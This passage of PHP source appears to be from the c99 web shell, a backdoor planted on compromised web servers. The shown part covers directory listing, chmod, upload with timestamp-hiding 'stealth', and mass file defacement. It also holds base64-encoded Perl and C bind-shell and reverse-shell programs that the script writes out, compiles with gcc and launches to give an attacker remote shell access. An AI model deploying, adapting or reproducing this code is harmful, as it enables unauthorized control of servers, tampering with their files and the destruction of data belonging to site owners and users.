&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".gchds($search_text_not,1," checked")."> - find files <u>NOT</u> containing the text
<br><br><input type=\"submit\" name=\"submit\" value=\"Search\"></form>";
 if ($act == "ls") {echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs</b><br><br>";}
}
if ($act == "chmod")
{
 $perms = fileperms($d.$f);
 if (!$perms) {echo "Can't get current mode.";}
 elseif ($submit)
 {
  if (!isset($owner[0])) {$owner[0] = 0;}
  if (!isset($owner[1])) {$owner[1] = 0; }
  if (!isset($owner[2])) {$owner[2] = 0;}
  if (!isset($group[0])) {$group[0] = 0;}
  if (!isset($group[1])) {$group[1] = 0;}
  if (!isset($group[2])) {$group[2] = 0;}
  if (!isset($world[0])) {$world[0] = 0;}
  if (!isset($world[1])) {$world[1] = 0;}
  if (!isset($world[2])) {$world[2] = 0;}
  $sum_owner = $owner[0] + $owner[1] + $owner[2];
  $sum_group = $group[0] + $group[1] + $group[2];
  $sum_world = $world[0] + $world[1] + $world[2];
  $sum_chmod = "0".$sum_owner.$sum_group.$sum_world;
  $ret = @chmod($d.$f, $sum_chmod);
  if ($ret) {$act = "ls";}
  else {echo "<b>Changing file-mode (".$d.$f.")</b>: error<br>";}
 }
 else
 {
  echo "<b>Changing file-mode</b><br>";
  $perms = view_perms(fileperms($d.$f));
  $length = strlen($perms);
  $owner_r = $owner_w = $owner_x =
  $group_r = $group_w = $group_x = 
  $world_r = $world_w = $group_x = "";

  if ($perms[1] == "r") {$owner_r = " checked";} if ($perms[2] == "w") {$owner_w = " checked";}
  if ($perms[3] == "x") {$owner_x = " checked";} if ($perms[4] == "r") {$group_r = " checked";}
  if ($perms[5] == "w") {$group_w = " checked";} if ($perms[6] == "x") {$group_x = " checked";}
  if ($perms[7] == "r") {$world_r = " checked";} if ($perms[8] == "w") {$world_w = " checked";}
												 if ($perms[9] == "x") {$world_x = " checked";}
  echo "<form method=\"POST\"><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value='".htmlspecialchars($f)."'>
<input type=hidden name=act value=chmod><input type=hidden name=submit value=1><input type=hidden name='owner[3]' value=no_error>
<input type=hidden name='group[3]' value=no_error><input type=hidden name='world[3]' value=no_error>
<table><tr><td><table align=center width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br>
<input type=checkbox NAME=owner[0] value=4".$owner_r.">Read<br><input type=checkbox NAME=owner[1] value=2".$owner_w.">Write<br>
<input type=checkbox NAME=owner[2] value=1".$owner_x.">Execute</font></td><td><b>Group</b><br><br>
<input type=checkbox NAME=group[0] value=4".$group_r.">Read<br>
<input type=checkbox NAME=group[1] value=2".$group_w.">Write<br>
<input type=checkbox NAME=group[2] value=1".$group_x.">Execute</font></td>
<td><b>World</b><br><br><input type=checkbox NAME=world[0] value=4".$world_r.">Read<br>
<input type=checkbox NAME=world[1] value=2".$world_w.">Write<br>
<input type=checkbox NAME=world[2] value=1".$world_x.">Execute</font></td>
</tr></table></td></tr><tr align=center><td><input type=submit name=chmod value=\"Save\"></td></tr></table></FORM>";
 }
}
if ($act == "upload")
{
 $uploadmess = "";
 $uploadpath = str_replace("\\","/",$uploadpath);
 if (empty($uploadpath)) {$uploadpath = $d;}
 elseif (substr($uploadpath,strlen($uploadpath)-1,1) != "/") {$uploadpath .= "/";}
 if (!empty($submit))
 {
  global $HTTP_POST_FILES;
  $uploadfile = $HTTP_POST_FILES["uploadfile"];
  if (!empty($uploadfile[tmp_name]))
  {
   if (empty($uploadfilename)) {$destin = $uploadfile[name];}
   else {$destin = $userfilename;}
   if (!move_uploaded_file($uploadfile[tmp_name],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile[name]." (can't copy \"".$uploadfile[tmp_name]."\" to \"".$uploadpath.$destin."\"!<br>";}
  }
  elseif (!empty($uploadurl))
  {
   if (!empty($uploadfilename)) {$destin = $uploadfilename;}
   else
   {
    $destin = explode("/",$destin);
    $destin = $destin[count($destin)-1];
    if (empty($destin))
    {
     $i = 0;
     $b = "";
     while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
   }
   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}
   else
   {
    $st = getmicrotime();
    $content = @file_get_contents($uploadurl);
    $dt = round(getmicrotime()-$st,4);
    if (!$content) {$uploadmess .=  "Can't download file!<br>";}
    else
    {
     if ($filestealth) {$stat = stat($uploadpath.$destin);}
     $fp = fopen($uploadpath.$destin,"w");
     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
     else
     {
      fwrite($fp,$content,strlen($content));
      fclose($fp);
      if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
     }
    }
   }
  }
 }
 if ($miniform)
 {
  echo "<b>".$uploadmess."</b>";
  $act = "ls";
 }
 else
 {
  echo "<b>File upload:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=\"POST\">
Select file on your local computer: <input name=\"uploadfile\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>
Input URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br>
Save this file dir: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
File-name (auto-fill): <input name=uploadfilename size=25><br><br>
<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>
<input type=\"submit\" name=\"submit\" value=\"Upload\">
</form>";
 }
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = false;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
  if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
 }
 $act = "ls";
}
if ($act == "deface")
{
 $deferr = "";
 foreach ($actbox as $v)
 {
  $data = $deface_html;
  if (eregi("%%%filedata%%%",$data)) {$data = str_replace("%%%filedata%%%",file_get_contents($v),$data);}
  $data = str_replace("%%%filename%%%",basename($v),$data);
  $data = str_replace("%%%filepath%%%",$v,$data);
  $fp = @fopen($v,"w");
  fwrite($fp,$data);
  fclose($fp);
  if (!$result) {$deferr .= "Can't deface ".htmlspecialchars($v)."<br>";}
  if (!empty($delerr)) {echo "<b>Defacing with errors:</b><br>".$deferr;}
 }
}
if (!$usefsbuff)
{
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"USEFSBUFF\" as TRUE.</center>";}
}
else
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls";}
 if ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
 if ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} $ls_arr = array_merge($sess_data["copy"],$sess_data["cut"]); c99_sess_put($sess_data); $act = "ls";}
 
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
 elseif ($actarcbuff)
 {
  $arcerr = "";
  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
  else {$ext = ".tar.gz";}
  
  if ($ext == ".tar.gz")
  {
   $cmdline = "tar cfzv";
  }
  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
  foreach($objects as $v)
  {
   $v = str_replace("\\","/",$v);
   if (is_dir($v))
   {
    if (substr($v,strlen($v)-1,strlen($v)) != "/") {$v .= "/";}
    $v .= "*";
   }
   $cmdline .= " ".$v;
  }
  $ret = `$cmdline`;
  if (empty($ret)) {$arcerr .= "Can't call archivator!<br>";}
  $ret = str_replace("\r\n","\n");
  $ret = explode("\n",$ret);
  if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
  foreach($sess_data["cut"] as $k=>$v)
  {
   if (in_array($v,$ret)) {fs_rmobj($v);}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
  $act = "ls";
 }
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
}
if ($act == "ls")
{
 if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
   while ($o = readdir($h)) {$list[] = $d.$o;}
   closedir($h);
  }
 }
 if (count($list) == 0) {echo "<center><b>Can't open directory (".htmlspecialchars($d).")!</b></center>";}
 else
 {
  //Building array
  $tab = array();
  $amount = count($ld)+count($lf);
  $vd = "f"; //Viewing mode
  if ($vd == "f")
  {
   $row = array();
   $row[] = "<b>Name</b>";
   $row[] = "<b>Size</b>";
   $row[] = "<b>Modify</b>";
   if (!$win)
  {$row[] = "<b>Owner/Group</b>";}
   $row[] = "<b>Perms</b>";
   $row[] = "<b>Action</b>";
   
   $k = $sort[0];
   if ((!is_numeric($k)) or ($k > count($row)-2)) {$k = 0;}
   if (empty($sort[1])) {$sort[1] = "d";}
   if ($sort[1] != "a")
   {
    $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k."a\"><img src=\"".$surl."act=img&img=sort_desc\" border=\"0\"></a>";
   }
   else
   {
    $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k."d\"><img src=\"".$surl."act=img&img=sort_asc\" border=\"0\"></a>";
   }
   
   $row[$k] .= $y;
   for($i=0;$i<count($row)-1;$i++)
   {
    if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$sort[1]."\">".$row[$i]."</a>";}
   }
   
   $tab = array();
   $tab[cols] = array($row);
   $tab[head] = array();
   $tab[dirs] = array();
   $tab[links] = array();
   $tab[files] = array();

   foreach ($list as $v)
   {
    $o = basename($v);
    $dir = dirname($v);
     
    if ($disp_fullpath) {$disppath = $v;}
    else {$disppath = $o;}
    $disppath = str2mini($disppath,60);
  
    if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
    elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}

    $uo = urlencode($o);
    $ud = urlencode($dir);
    $uv = urlencode($v);

    $row = array();

    if ($o == ".")
    {
     $row[] = "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif ($o == "..")
    {
     $row[] = "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif (is_dir($v))
    {
     if (is_link($v)) {$disppath .= " => ".readlink($v); $type = "LINK";}
     else {$type = "DIR";}
     $row[] =  "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";
     $row[] = $type;
    }
    elseif(is_file($v))
    {
     $ext = explode(".",$o);
     $c = count($ext)-1;
     $ext = $ext[$c];
     $ext = strtolower($ext);
     $row[] =  "<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\">".$disppath."</a>";
     $row[] = view_size(filesize($v));
    }
    $row[] = date("d.m.Y H:i:s",filemtime($v));
     
    if (!$win)
    {
     $ow = @posix_getpwuid(fileowner($v));
     $gr = @posix_getgrgid(filegroup($v));
     $row[] = $ow["name"]."/".$gr["name"];
    }
         
    if (is_writable($v)) {$row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><font color=\"green\">".view_perms(fileperms($v))."</font></a>";}
    else {$row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><font color=\"red\">".view_perms(fileperms($v))."</font></a>";}

    if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<input type=\"checkbox\" name=\"actbox[]\" value=\"".htmlspecialchars($v)."\">";}
    else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" title=\"Download\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<input type=\"checkbox\" name=\"actbox[]\" value=\"".htmlspecialchars($v)."\">";}

    if (($o == ".") or ($o == "..")) {$tab[head][] = $row;}
    elseif (is_link($v)) {$tab[links][] = $row;}
    elseif (is_dir($v)) {$tab[dirs][] = $row;}
    elseif (is_file($v)) {$tab[files][] = $row;}
   }   
  }
  $v = $sort[0];
  function tabsort($a, $b)
  {
   global $v;
   return strnatcasecmp(strip_tags($a[$v]), strip_tags($b[$v]));
  }
  usort($tab[dirs], "tabsort");
  usort($tab[files], "tabsort");
  if ($sort[1] == "a")
  {
   $tab[dirs] = array_reverse($tab[dirs]);
   $tab[files] = array_reverse($tab[files]);
  }
  //Compiling table
  $table = array_merge($tab[cols],$tab[head],$tab[dirs],$tab[links],$tab[files]);
  echo "<center><b>Listing directory (".count($tab[files])." files and ".(count($tab[dirs])+count($tab[links]))." directories):</b></center><br>";
  echo "<TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#333333 border=0><form method=\"POST\">";
  foreach($table as $row)
  {
   echo "<tr>\r\n";
   foreach($row as $v) {echo "<td>".$v."</td>\r\n";}
   echo "</tr>\r\n";
  }
  echo "</table><hr size=\"1\" noshade><p align=\"right\"><b><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";
  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))
  {
   echo "<input type=\"submit\" name=\"actarcbuff\" value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"submit\" name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=\"submit\" name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  }
  echo "<select name=\"act\"><option value=\"".$act."\">With selected:</option>";
  echo "<option value=\"delete\"".gchds($dspact,"delete"," selected").">Delete</option>";
  if ($usefsbuff)
  {
   echo "<option value=\"cut\"".gchds($dspact,"cut"," selected").">Cut</option>";
   echo "<option value=\"copy\"".gchds($dspact,"copy"," selected").">Copy</option>";
   echo "<option value=\"unselect\"".gchds($dspact,"unselect"," selected").">Unselect</option>";
  }
  if ($dspact == "massdeface") {echo "<option value=\"deface\"".gchds($dspact,"deface"," selected").">Unselect</option>";}
  echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></p>";
  echo "</form>";
 }
}
if ($act == "bind")
{
 $bndsrcs = array(
"c99sh_bindport.pl"=>
"IyEvdXNyL2Jpbi9wZXJsDQppZiAoQEFSR1YgPCAxKSB7ZXhpdCgxKTt9DQokcG9ydCA9ICRBUkdW".
"WzBdOw0KZXhpdCBpZiBmb3JrOw0KJDAgPSAidXBkYXRlZGIiIC4gIiAiIHgxMDA7DQokU0lHe0NI".
"TER9ID0gJ0lHTk9SRSc7DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsIFBGX0lORVQsIFNPQ0tfU1RS".
"RUFNLCAwKTsNCnNldHNvY2tvcHQoUywgU09MX1NPQ0tFVCwgU09fUkVVU0VBRERSLCAxKTsNCmJp".
"bmQoUywgc29ja2FkZHJfaW4oJHBvcnQsIElOQUREUl9BTlkpKTsNCmxpc3RlbihTLCA1MCk7DQph".
"Y2NlcHQoWCxTKTsNCm9wZW4gU1RESU4sICI8JlgiOw0Kb3BlbiBTVERPVVQsICI+JlgiOw0Kb3Bl".
"biBTVERFUlIsICI+JlgiOw0KZXhlYygiZWNobyBcIldlbGNvbWUgdG8gYzk5c2hlbGwhXHJcblxy".
"XG5cIiIpOw0Kd2hpbGUoMSkNCnsNCiBhY2NlcHQoWCwgUyk7DQogdW5sZXNzKGZvcmspDQogew0K".
"ICBvcGVuIFNURElOLCAiPCZYIjsNCiAgb3BlbiBTVERPVVQsICI+JlgiOw0KICBjbG9zZSBYOw0K".
"ICBleGVjKCIvYmluL3NoIik7DQogfQ0KIGNsb3NlIFg7DQp9",

"c99sh_bindport.c"=>
"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8c3lzL3R5".
"cGVzLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4N".
"CiNpbmNsdWRlIDxlcnJuby5oPg0KaW50IG1haW4oYXJnYyxhcmd2KQ0KaW50IGFyZ2M7DQpjaGFy".
"ICoqYXJndjsNCnsgIA0KIGludCBzb2NrZmQsIG5ld2ZkOw0KIGNoYXIgYnVmWzMwXTsNCiBzdHJ1".
"Y3Qgc29ja2FkZHJfaW4gcmVtb3RlOw0KIGlmKGZvcmsoKSA9PSAwKSB7IA0KIHJlbW90ZS5zaW5f".
"ZmFtaWx5ID0gQUZfSU5FVDsNCiByZW1vdGUuc2luX3BvcnQgPSBodG9ucyhhdG9pKGFyZ3ZbMV0p".
"KTsNCiByZW1vdGUuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7IA0KIHNvY2tm".
"ZCA9IHNvY2tldChBRl9JTkVULFNPQ0tfU1RSRUFNLDApOw0KIGlmKCFzb2NrZmQpIHBlcnJvcigi".
"c29ja2V0IGVycm9yIik7DQogYmluZChzb2NrZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmcmVtb3Rl".
"LCAweDEwKTsNCiBsaXN0ZW4oc29ja2ZkLCA1KTsNCiB3aGlsZSgxKQ0KICB7DQogICBuZXdmZD1h".
"Y2NlcHQoc29ja2ZkLDAsMCk7DQogICBkdXAyKG5ld2ZkLDApOw0KICAgZHVwMihuZXdmZCwxKTsN".
"CiAgIGR1cDIobmV3ZmQsMik7DQogICB3cml0ZShuZXdmZCwiUGFzc3dvcmQ6IiwxMCk7DQogICBy".
"ZWFkKG5ld2ZkLGJ1ZixzaXplb2YoYnVmKSk7DQogICBpZiAoIWNocGFzcyhhcmd2WzJdLGJ1Zikp".
"DQogICBzeXN0ZW0oImVjaG8gd2VsY29tZSB0byBjOTlzaGVsbCAmJiAvYmluL2Jhc2ggLWkiKTsN".
"CiAgIGVsc2UNCiAgIGZwcmludGYoc3RkZXJyLCJTb3JyeSIpOw0KICAgY2xvc2UobmV3ZmQpOw0K".
"ICB9DQogfQ0KfQ0KaW50IGNocGFzcyhjaGFyICpiYXNlLCBjaGFyICplbnRlcmVkKSB7DQppbnQg".
"aTsNCmZvcihpPTA7aTxzdHJsZW4oZW50ZXJlZCk7aSsrKSANCnsNCmlmKGVudGVyZWRbaV0gPT0g".
"J1xuJykNCmVudGVyZWRbaV0gPSAnXDAnOyANCmlmKGVudGVyZWRbaV0gPT0gJ1xyJykNCmVudGVy".
"ZWRbaV0gPSAnXDAnOw0KfQ0KaWYgKCFzdHJjbXAoYmFzZSxlbnRlcmVkKSkNCnJldHVybiAwOw0K".
"fQ==",

"c99sh_backconn.pl"=>
"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJ".
"HN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2VjaG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZ".
"DsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJ".
"HRhcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0L".
"CAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgnd".
"GNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBka".
"WUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yO".
"iAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLR".
"VQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlK".
"FNURElOKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==",

"c99sh_backconn.c"=>
"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5l".
"dGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZk".
"Ow0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJybSAtZiAiOyANCiBk".
"YWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0g".
"aHRvbnMoYXRvaShhcmd2WzJdKSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihh".
"cmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJsZW4oYXJndlsy".
"XSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsg".
"DQogaWYgKChjb25uZWN0KGZkLCAoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1".
"Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7DQogICBleGl0".
"KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIo".
"ZmQsIDApOw0KIGR1cDIoZmQsIDEpOw0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwi".
"c2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=="
);

 $bndportsrcs = array(
"c99sh_bindport.pl"=>array("Using PERL","perl %path %port"),
"c99sh_bindport.c"=>array("Using C","%path %port %pass")
);

 $bcsrcs = array(
"c99sh_backconn.pl"=>array("Using PERL","perl %path %host %port"),
"c99sh_backconn.c"=>array("Using C","%path %host %port")
);

 if ($win) {echo "<b>Binding port and Back connect:</b><br>This functions not work in Windows!<br><br>";}
 else
 {
  if (!is_array($bind)) {$bind = array();}
  if (!is_array($bc)) {$bc = array();}
  if (!is_numeric($bind[port])) {$bind[port] = $bindport_port;}
  if (empty($bind[pass])) {$bind[pass] = $bindport_pass;}
  if (empty($bc[host])) {$bc[host] = $REMOTE_ADDR;}
  if (!is_numeric($bc[port])) {$bc[port] = $bindport_port;}
  if (!empty($bindsubmit))
  {
   echo "<b>Result of binding port:</b><br>";
   $v = $bndportsrcs[$bind[src]];
   if (empty($v)) {echo "Unknown file!<br>";}
   elseif (fsockopen($SERVER_ADDR,$bind[port],$errno,$errstr,0.1)) {echo "Port alredy in use, select any other!<br>";}
   else
   {
    $srcpath = $tmpdir.$bind[src];
    $w = explode(".",$bind[src]);
    $ext = $w[count($w)-1];
    unset($w[count($w)-1]);
    $binpath = $tmpdir.join(".",$w);
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
    if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
    else
    {
     $data = base64_decode($bndsrcs[$bind[src]]);
     fwrite($fp,$data,strlen($data));
     fclose($fp);

     if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  @unlink($srcpath);}

     $v[1] = str_replace("%path",$binpath,$v[1]);
     $v[1] = str_replace("%port",$bind[port],$v[1]);
     $v[1] = str_replace("%pass",$bind[pass],$v[1]);
     $v[1] = str_replace("//","/",$v[1]);
     $retbind = myshellexec($v[1]." > /dev/null &");
     sleep(5); //Timeout
     $sock = fsockopen("localhost",$bind[port],$errno,$errstr,5);
     if (!$sock) {echo "I can't connect to localhost:".$bind[port]."! I think you should configure your firewall.";}
     else {echo "Binding... ok! Connect to <b>".$SERVER_ADDR.":".$bind[port]."</b>! You should use NetCat&copy;, run \"<b>nc -v ".$SERVER_ADDR." ".$bind[port]."</b>\"!<center><a href=\"".$surl."act=ps_aux&grep=".basename($binpath)."\"><u>View binder's process</u></a></center>";}
    }
    echo "<br>";
   }
  }
  if (!empty($bcsubmit))
  {
   echo "<b>Result of back connection:</b><br>";
   $v = $bcsrcs[$bc[src]];
   if (empty($v)) {echo "Unknown file!<br>";}
   else
   {
    $srcpath = $tmpdir.$bc[src];
    $w = explode(".",$bc[src]);
    $ext = $w[count($w)-1];
    unset($w[count($w)-1]);
    $binpath = $tmpdir.join(".",$w);
    if ($ext == "pl") {$binpath = $srcpath;}
    @unlink($srcpath);
    $fp = fopen($srcpath,"ab+");
    if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
    else
    {
     $data = base64_decode($bndsrcs[$bind[src]]);
     fwrite($fp,$data,strlen($data));
     fclose($fp);
     if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
     $v[1] = str_replace("%path",$binpath,$v[1]);
     $v[1] = str_replace("%host",$bc[host],$v[1]);
     $v[1] = str_replace("%port",$bc[port],$v[1]);
     $v[1] = str_replace("//","/",$v[1]);
     $retbind = myshellexec($v[1]." > /dev/null &");
     echo "Now script try connect to ".$bc[host].":".$bc[port]."...<br>";
    }
   }
  }
  ?><b>Binding port:</b><br><form method="POST"><input type="hidden" name="act" value="bind"><input type="hidden" name="d" value="<? echo $d; ?>">Port: <input type="text" name="bind[port]" value="<?php echo htmlspecialchars($bind[port]); ?>">&nbsp;Password: <input type="text" name="bind[pass]" value="<?php echo htmlspecialchars($bind[pass]); ?>">&nbsp;<select name="bind[src]"><?php
foreach($bndportsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bind[src]) {echo " selected";} echo ">".$v[0]."</option>";}
?></select>&nbsp;<input type="submit" name="bindsubmit" value="Bind"></form>
<b>Back connection:</b><br><form method="POST"><input type="hidden" name="act" value="bind"><input type="hidden" name="d" value="<? echo $d; ?>">HOST: <input type="text" name="bc[host]" value="<?php echo htmlspecialchars($bc[host]); ?>">&nbsp;Port: <input type="text" name="bc[port]" value="<?php echo htmlspecialchars($bc[port]); ?>">&nbsp;<select name="bc[src]"><?php
foreach($bcsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc[src]) {echo " selected";} echo ">".$v[0]."</option>";}
?></select>&nbsp;<input type="submit" name="bcsubmit" value="Connect"></form>
